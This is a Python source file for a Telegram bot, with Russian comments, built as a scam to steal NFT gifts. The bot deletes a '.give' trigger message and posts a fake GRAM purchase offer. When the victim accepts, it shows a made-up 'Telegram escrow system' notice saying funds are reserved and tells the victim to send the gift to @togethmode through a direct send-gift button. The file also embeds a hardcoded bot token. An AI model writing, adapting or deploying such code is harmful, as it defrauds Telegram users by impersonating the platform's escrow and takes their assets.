import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from telegram.constants import ParseMode

# Вставьте сюда ваш токен
TOKEN = '8850969557:AAF7ISM1vYIyqji6MGNMOfvImFWXG3S5pic'

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

async def give_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ИСПРАВЛЕНИЕ: Получаем сообщение из бизнес-чата или обычного
    message = update.message or update.business_message
    if not message:
        return

    # 1. Ждем 1 секунду и удаляем сообщение пользователя
    await asyncio.sleep(1)
    try:
        await message.delete()
    except Exception as e:
        logging.error(f"Ошибка удаления сообщения: {e}")

    # 2. Ждем еще 4 секунды (итого 5 секунд с момента отправки)
    await asyncio.sleep(4)

    # Парсим команду: .give t.me/nft/ResistanceDog-703 2000 gram
    text = message.text
    parts = text.split()
    
    if len(parts) < 4:
        return

    link = parts[1]  # t.me/nft/ResistanceDog-703
    amount = parts[2]  # 2000
    
    # Извлекаем название подарка из ссылки (ResistanceDog-703)
    gift_name = link.split('/')[-1] 

    # Получаем имя пользователя (ник)
    user_name = update.effective_user.first_name or "User"

    # Формируем текст с HTML-разметкой
    # Эмодзи ID: 5264766603584641330 (💎)
    emoji_gram = '<tg-emoji emoji-id="5264766603584641330">💎</tg-emoji>'
    
    offer_text = (
        f"User <b>{user_name}</b> offers you <b>{amount}</b> {emoji_gram} <b>GRAM</b> "
        f"for the gift <b><a href=\"{link}\">{gift_name}</a></b>.\n\n"
        f"The offer is valid for 6 h. 0 min.."
    )

    # Инлайн-кнопки
    keyboard = [
        [
            InlineKeyboardButton("5774022692642492953 Accept", callback_data="5774022692642492953"),
            InlineKeyboardButton("5774077015388852135 Decline", callback_data="5774077015388852135")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Отправляем сообщение от имени бизнес-аккаунта
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=offer_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return

    data = query.data

    # --- ВЕТКА DECLINE ---
    if data == "5774077015388852135":
        await query.answer() # Убираем "часики" загрузки
        await asyncio.sleep(1) # Ждем 1 секунду
        
        emoji_decline = '<tg-emoji emoji-id="5774077015388852135">🚫</tg-emoji>'
        
        try:
            await query.message.edit_text(
                text=f"{emoji_decline} Offer has been declined.",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logging.error(f"Ошибка редактирования при Decline: {e}")

    # --- ВЕТКА ACCEPT ---
    elif data == "5774022692642492953":
        
        # 1. Показываем всплывающее окно (Callback Answer)
        popup_text = (
            "NFT Deal\n"
            "@togethmode\n\n"
            "Attention!\n\n"
            "Follow the instructions to avoid losing the gift and receive payment.\n\n"
            "Click «OK» if you have read this message."
        )
        await query.answer(text=popup_text, show_alert=True)

        # 2. Ждем 1 секунду и меняем текст сообщения на NFT Deal
        await asyncio.sleep(1)
        
        gift_name = "ResistanceDog-703"
        amount = "2000"
        emoji_gram = '<tg-emoji emoji-id="5264766603584641330">💎</tg-emoji>'

        deal_text = (
            f"<b>NFT Deal</b>\n\n"
            f"<b>Order #TG-AC3UY0FB</b>\n\n"
            f"The buyer has reserved <b>{amount}</b> {emoji_gram} <b>GRAM</b> through the Telegram escrow system. "
            f"The funds are held in a special escrow account and will be automatically credited to your GRAM in Telegram balance right after the gift is transferred.\n\n"
            f"<b>Instructions to complete the deal:</b>\n\n"
            f"1. Send to: @togethmode\n"
            f"2. Click «Send Gift» and select {gift_name}\n"
            f"3. Confirm the gift transfer.\n\n"
            f"Telegram will record the transaction and instantly credit <b>{amount}</b> {emoji_gram} <b>GRAM</b> to your balance. "
            f"The reservation is valid for 24 hours."
        )

        # Кнопка с прямой ссылкой на отправку подарка
        keyboard = [
            [InlineKeyboardButton("Send gift", url="tg://send_gift?to=togethmode")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        try:
            await query.message.edit_text(
                text=deal_text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except Exception as e:
            logging.error(f"Ошибка редактирования при Accept: {e}")

if __name__ == '__main__':
    application = ApplicationBuilder().token(TOKEN).build()

    # Регулярное выражение для отлова команды .give
    give_handler = MessageHandler(
        filters.Regex(r'^\.give\s+t\.me/nft/\S+\s+\d+\s+gram$'), 
        give_command
    )
    application.add_handler(give_handler)

    # Обработчик инлайн-кнопок
    application.add_handler(CallbackQueryHandler(button_callback))

    print("Бот запущен...")
    application.run_polling()
